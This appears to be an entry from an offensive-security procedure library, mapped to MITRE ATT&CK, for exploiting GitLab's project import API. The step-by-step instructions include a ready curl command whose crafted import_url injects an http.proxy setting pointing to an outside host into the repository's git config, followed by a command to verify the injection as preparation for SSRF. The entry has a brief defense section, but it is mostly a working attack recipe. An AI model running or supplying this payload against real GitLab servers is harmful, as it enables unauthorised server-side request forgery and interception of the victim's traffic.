---
id: proc-uuid-003
tags:
  - injection
  - gitlab-api
  - git-config
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-create-project-with-injection]]'
  - '[[commands/sudocat-git-config]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.554Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Project-with-Malicious-Import-URL

## Summary

This procedure uses the GitLab API to create a project with a crafted import_url that injects http.proxy into the git config during clone, setting up for SSRF redirection.

## Description

Gitaly's git clone command appends -c http.<url>.extraHeader=..., but dotted URLs like http://user@google.com/.proxy=... parse as http.proxy, overriding the proxy to http://proxy.aw.rs:8500. This injects into .git/config. Requires GitLab API token and access to /api/v4/projects.

## Requirements

1. GitLab API bearer token ($TOKEN)
2. Access to GitLab instance (e.g., http://gitlab-vm.local)
3. Permissions to create projects

## Defense

Defensive measures and detection strategies:

- Sanitize import_url to prevent dotted git config injection
- Validate URLs in gitaly before passing to git clone
- Log and audit project creation APIs for suspicious URLs

## Objectives

1. Create project injecting proxy config
2. Verify injection in .git/config
3. Prepare for DNS-triggered SSRF

## Instructions

### Step 1: Create Project via API

**Context**: POST to /api/v4/projects with malicious import_url to trigger config injection on clone attempt.

**Command** ([[commands/curl-create-project-with-injection]]):
```bash
curl -H "Authorization: Bearer $TOKEN" -v -XPOST 'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4'
```

> Expected output: 201 Created with project ID (e.g., 204).

### Step 2: Verify Injected Config

**Context**: Inspect the generated .git/config to confirm proxy injection.

**Command** ([[commands/sudocat-git-config]]):
```bash
sudocat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config
```

> Expected output: [http "http://google.com/"] proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-create-project-with-injection]]
- [[commands/sudocat-git-config]]

## Tools Used


## Tags

- injection
- gitlab-api
